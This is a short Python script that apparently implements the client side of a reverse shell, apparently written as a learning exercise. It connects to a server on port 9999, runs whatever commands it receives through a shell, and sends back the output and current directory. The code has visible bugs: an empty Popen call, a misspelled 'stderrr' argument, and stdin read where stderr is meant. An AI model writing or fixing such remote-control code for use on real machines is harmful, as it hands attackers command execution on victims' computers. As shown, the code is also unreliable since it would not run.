import socket
import os
import subprocess

s= socket.socket()
host="localhost" #basically the laptop's local ip address
port=9999

s.connect((host, port)) #connects the socket from the client's side too
while True:
    data = s.recv(1024)
    #data checks, since a lot of commands don't give outputs, they just do operations
    if data[:2].decode("utf-8") == 'cd': #decodes the first 2 bytes
        os.chdir(data[3:].decode("utf-8")) #decodes the rest of the characters starting from 3
    if len(data) > 0:
        cmd= subprocess.Popen()(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderrr=subprocess.PIPE) #opens a process which executes whatever statement was written in the server commands
        #shell=True accesses the shell commands on the client laptop
        #the subprocess.PIPE stuff recognizes for errors in the cmd line

        #send output to the server
        output_byte=cmd.stdout.read() + cmd.stdin.read()
        output_str= str(output_byte, "utf-8") #doesn't do as much stuff to the string as it did higher, with the byte
        currentWD = os.getcwd() + ">" #sends current working directory
        s.send(str.encode(output_str + currentWD)) #sending the output string and the directory back to the server
        #prints out what the server does on the client computer
        print(output_str)
